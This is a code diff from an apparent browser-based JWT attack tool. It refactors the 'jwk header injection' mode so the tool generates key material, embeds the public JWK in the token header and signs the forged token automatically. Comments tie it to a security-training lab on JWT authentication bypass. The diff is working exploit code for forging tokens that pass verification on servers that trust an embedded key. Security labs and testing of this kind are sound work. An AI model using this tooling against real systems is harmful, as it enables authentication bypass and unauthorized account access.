@@ -77,32 +77,26 @@ async function generateJwkAttackToken(forceJwkSign) {
 
     if (selectedAttack === 'jwk-header-injection') {
       const alg = jwkAlgSelect.value;
+      if (!generatedJwkMaterial || generatedJwkMaterial.alg !== alg) {
+        generatedJwkMaterial = await generateKeyMaterialForAlg(alg);
+      }
+
+      const publicJwk = minimalPublicJwk(generatedJwkMaterial.publicJwk);
+      extraInput.value = JSON.stringify(publicJwk);
+
+      // Keep header minimal for embedded JWK attack.
+      delete nextHeader.kid;
+      delete nextHeader.jku;
+      delete nextHeader.jwk;
       nextHeader.alg = alg;
-
-      let publicJwk;
-      if (extraInput.value.trim()) {
-        publicJwk = readJsonInput('{"kty":"RSA","e":"AQAB","n":"..."}', 'Provide public JWK JSON.');
-      } else if (generatedJwkMaterial?.publicJwk) {
-        publicJwk = generatedJwkMaterial.publicJwk;
-        extraInput.value = JSON.stringify(publicJwk);
-      } else {
-        throw new Error('Generate key first or provide public JWK JSON.');
-      }
-
       nextHeader.jwk = publicJwk;
-      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
 
-      if (generatedJwkMaterial && generatedJwkMaterial.alg === alg && isSameJwk(generatedJwkMaterial.publicJwk, publicJwk)) {
-        nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);
-      } else if (forceJwkSign) {
-        throw new Error('Cannot sign: selected JWK does not match generated key material.');
-      } else {
-        nextSig = '<generate-key-or-sign-manually>';
-      }
+      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+      nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);
 
       notes = [
         `Lab: JWT authentication bypass via jwk header injection (${alg}).`,
-        'Burp-style flow: generated key embedded as jwk and token signed with private key.',
+        'Auto flow: key generated -> public JWK embedded -> token signed automatically.',
       ];
     }
 
@@ -188,24 +182,9 @@ function getPresetHint(key) {
 async function generateKeyForJwkAttack() {
   try {
     const alg = jwkAlgSelect.value;
-    let publicJwk;
-
-    if (alg.startsWith('HS')) {
-      const secret = randomSecret(32);
-      publicJwk = { kty: 'oct', k: utf8ToBase64url(secret), alg };
-      generatedJwkMaterial = { alg, secret, publicJwk };
-      extraInput.value = JSON.stringify(publicJwk);
-      jwkAlgHelp.textContent = `Generated symmetric key for ${alg}.`; 
-      return;
-    }
-
-    const pair = await generateKeyPairForAlg(alg);
-    publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
-    const privateJwk = await crypto.subtle.exportKey('jwk', pair.privateKey);
-
-    generatedJwkMaterial = { alg, publicJwk, privateJwk };
-    extraInput.value = JSON.stringify(publicJwk);
-    jwkAlgHelp.textContent = `Generated key pair for ${alg} and inserted public JWK.`;
+    generatedJwkMaterial = await generateKeyMaterialForAlg(alg);
+    extraInput.value = JSON.stringify(minimalPublicJwk(generatedJwkMaterial.publicJwk));
+    jwkAlgHelp.textContent = `Generated key material for ${alg}. Ready to embed/sign.`;
   } catch (err) {
     decodeError.textContent = `JWK key generation error: ${err.message}`;
   }
@@ -235,6 +214,27 @@ async function generateKeyPairForAlg(alg) {
   throw new Error(`Unsupported algorithm: ${alg}`);
 }
 
+
+async function generateKeyMaterialForAlg(alg) {
+  if (alg.startsWith('HS')) {
+    const secret = randomSecret(32);
+    return { alg, secret, publicJwk: { kty: 'oct', k: utf8ToBase64url(secret) } };
+  }
+
+  const pair = await generateKeyPairForAlg(alg);
+  const publicJwk = await crypto.subtle.exportKey('jwk', pair.publicKey);
+  const privateJwk = await crypto.subtle.exportKey('jwk', pair.privateKey);
+  return { alg, publicJwk, privateJwk };
+}
+
+function minimalPublicJwk(jwk) {
+  if (!jwk || !jwk.kty) throw new Error('Invalid JWK');
+  if (jwk.kty === 'RSA') return { kty: 'RSA', n: jwk.n, e: jwk.e };
+  if (jwk.kty === 'EC') return { kty: 'EC', crv: jwk.crv, x: jwk.x, y: jwk.y };
+  if (jwk.kty === 'OKP') return { kty: 'OKP', crv: jwk.crv, x: jwk.x };
+  if (jwk.kty === 'oct') return { kty: 'oct', k: jwk.k };
+  return jwk;
+}
 async function signWithMaterial(signingInput, alg, material) {
   if (alg.startsWith('HS')) return hmacSignBase64url(signingInput, material.secret, hashFromAlg(alg));
   if (alg.startsWith('RS')) return rsaPkcs1SignBase64url(signingInput, material.privateJwk, hashFromAlg(alg));
